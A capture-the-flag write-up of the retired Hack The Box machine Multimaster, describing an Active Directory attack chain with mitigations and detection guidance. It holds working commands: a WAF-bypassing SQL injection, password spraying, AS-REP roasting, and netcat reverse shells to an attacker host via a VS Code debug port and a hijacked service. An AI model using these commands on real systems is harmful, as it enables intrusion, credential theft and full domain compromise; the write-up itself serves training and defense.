---
machine: Multimaster
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / MSSQL
state: Retired
tags: [windows, active-directory, mssql, sqli, cef-debug, genericwrite, as-rep, server-operators]
---

# Multimaster — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired according to HTB and public writeups; not verified with an HTB session.
> Method note: no flags or real credentials.

## TL;DR

DC `MULTIMASTER.MEGACORP.LOCAL` in the `MEGACORP.LOCAL` domain. The `/api/getColleagues` API is vulnerable to **SQL injection**; the WAF is bypassed with Unicode escapes. The `Logins` dump yields Keccak-384 hashes and passwords; `SUSER_SID`/`SUSER_SNAME` enumerate AD users and reveal `tushikikatomo`, who has WinRM. From there, CVE-2019-1414 in VS Code's debug port leads to `cyork`; a connection string in `MultimasterAPI.dll` gives `sbauer`; `sbauer` has `GenericWrite` over `jorden` and enables AS-REP; `jorden` is a **Server Operator** and hijacks a service binary to reach SYSTEM.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0 (MegaCorp)
88/tcp    kerberos-sec  Microsoft Windows Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap          AD LDAP (Domain: MEGACORP.LOCAL)
445/tcp   microsoft-ds (signing required)
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
3389/tcp  ms-wbt-server
5985/tcp  wsman
9389/tcp  adws
```

- DC `MULTIMASTER`, domain `MEGACORP.LOCAL`, Windows Server 2016.
- The web app is a "MegaCorp" site with a JSON API.
- MSSQL 2017 sits behind the web app; 1433 appears in some scans and not others, so injection is the reliable path, not a direct connection.
- SMB requires signing; it is not the foothold.

```bash
printf '%s\n' '<IP> megacorp.local multimaster.megacorp.local MULTIMASTER' | sudo tee -a /etc/hosts
```

## Enumeration

The API accepts JSON with `name`:

```bash
curl -s -X POST http://multimaster.megacorp.local/api/getColleagues \
  -H 'Content-Type: application/json' \
  -d '{"name":"test"}'
```

The field is concatenated into SQL. The WAF blocks quotes, spaces and `and`/`or`; Unicode escapes (`\u0027`, `\u0020`, etc.) bypass it. Capture the request in Burp and run sqlmap:

```bash
sqlmap -r colleagues.request --tamper=charunicodeescape \
  --delay 5 --level 5 --risk 3 --batch --dbms=mssql
```

The `Hub_DB` database has `Colleagues` and `Logins`. `Logins` hashes are 96 hex characters: **Keccak-384**, not SHA-384. Identify and crack them with the matching tool/mode; recovered passwords are low entropy and reused.

## Foothold

### From SQLi to AD users

The same injection can call SQL Server functions that resolve SIDs. Instead of a wordlist, use **RID cycling** with `SUSER_SID` and `SUSER_SNAME`:

```sql
test' UNION ALL SELECT 58,58,58,SUSER_SID('MEGACORP\Domain Admins'),58-- -
test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- -
test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x010500000000000515000000...),58-- -
```

The domain SID is known; iterate the RID and collect names absent from the database. `MEGACORP\tushikikatomo` appears and was not in the dump.

### WinRM

Spray the recovered password against the enumerated users:

```bash
crackmapexec smb multimaster.megacorp.local -u users.txt -p passwords.txt \
  --continue-on-success
evil-winrm -u 'MEGACORP\tushikikatomo' -p '<PASS_TUSHIKIKATOMO>' \
  -i multimaster.megacorp.local
```

The user flag is at `C:\Users\alcibiades\Desktop`, even though the account is `tushikikatomo`; the profile does not match the account name.

## Privilege escalation

### tushikikatomo → cyork: CVE-2019-1414

VS Code exposes a CEF debug port on localhost. `cefdebug.exe` discovers the WebSocket and runs JavaScript in Electron's context:

```powershell
.\cefdebug.exe
.\cefdebug.exe --url ws://127.0.0.1:<PORT>/<GUID> --code ^
  "process.mainModule.require('child_process').exec('C:/temp/nc64.exe -e cmd.exe <LHOST> 443')"
```

The process runs as `cyork`; a shell follows.

### cyork → sbauer: connection string in the DLL

`C:\inetpub\wwwroot\bin\MultimasterAPI.dll` contains a connection string:

```text
server=localhost;database=Hub_DB;uid=finder;password=<PASS_FINDER>;
```

Extract it with `strings -el` and test it against the users:

```bash
strings -el MultimasterAPI.dll | grep -i 'password'
crackmapexec smb multimaster.megacorp.local -u users.txt -p '<PASS_FINDER>'
```

It matches `sbauer` (`<PASS_SBAUER>`).

### sbauer → jorden: GenericWrite and AS-REP

BloodHound shows `sbauer` has **GenericWrite** over `jorden`:

```bash
bloodhound-python -u sbauer -p '<PASS_SBAUER>' -c All \
  -d megacorp.local -dc multimaster.megacorp.local -ns <IP>
```

Use that right to set `DONT_REQ_PREAUTH` on `jorden`:

```powershell
Set-DomainObject -Identity jorden -XOR @{useraccountcontrol = 4194304} -Verbose
# alternative: Set-ADAccountControl jorden -DoesNotRequirePreAuth $true
```

Request the AS-REP and crack it:

```bash
GetNPUsers.py -no-pass -dc-ip <IP> MEGACORP/jorden -format hashcat
hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt
```

Result: `jorden:<PASS_JORDEN>`. Revert the UAC flag afterwards.

### jorden → SYSTEM: Server Operators

`jorden` is a **Server Operator**, allowed to change service configuration. Point a service binary at a local executable:

```powershell
sc.exe config browser binPath= "C:\ProgramData\nc64.exe -e cmd.exe <LHOST> 443"
sc.exe stop browser
sc.exe start browser
```

```text
nt authority\system
```

Documented alternative: `jorden` also has `SeBackupPrivilege`; `robocopy /b` can copy the root flag from Administrator's desktop without touching a service. **There is no RBCD on this box**: the path is GenericWrite over a user, not delegation.

## Evidence

- Request to `/api/getColleagues` and sqlmap with `charunicodeescape`.
- `Logins` dump, hashes identified as Keccak-384 and passwords redacted.
- RID cycling with `SUSER_SID`/`SUSER_SNAME` and `tushikikatomo`.
- WinRM as `tushikikatomo`.
- `cefdebug.exe` and a shell as `cyork`.
- DLL connection string and `sbauer`.
- BloodHound `GenericWrite` over `jorden`; UAC `4194304`; AS-REP.
- `sc.exe config` and `nt authority\system`, no hashes or flags.

## Lessons learned

- A WAF blocking quotes and spaces does not block SQL semantics: Unicode escapes rebuild the payload.
- 96-hex hashes can be Keccak-384; identify them instead of wasting time on SHA-384.
- `SUSER_SID`/`SUSER_SNAME` turn SQL injection into AD enumeration, without LDAP or credentials.
- A profile name (`alcibiades`) does not always match the `sAMAccountName` (`tushikikatomo`).
- `GenericWrite` over a user enables AS-REP without touching the password; Server Operators turns access into SYSTEM.

## Mitigations and detection

- Parameterise queries; a WAF is no substitute for prepared statements. Validate JSON and limit the API surface.
- Do not store connection strings with passwords in DLLs; use integrated authentication or a secret manager.
- Review `GenericWrite`/`GenericAll` over users; monitor UAC changes (4738) and AS-REP (4768).
- Restrict Server Operators and service configuration rights; audit 7045 and changes under `HKLM\SYSTEM\CurrentControlSet\Services`.
- Detection: 4662, 4738, 4768/4769, 7045, 4697 and anomalous SQL queries.
- MITRE: T1190, T1558.004, T1098, T1543.003, T1003.

## References

- <https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html>
- <https://axcheron.github.io/writeups/htb/multimaster>
- <https://chr0x6eos.github.io/2020/09/19/htb-Multimaster.html>
- <https://www.hackthebox.com/machines/multimaster>
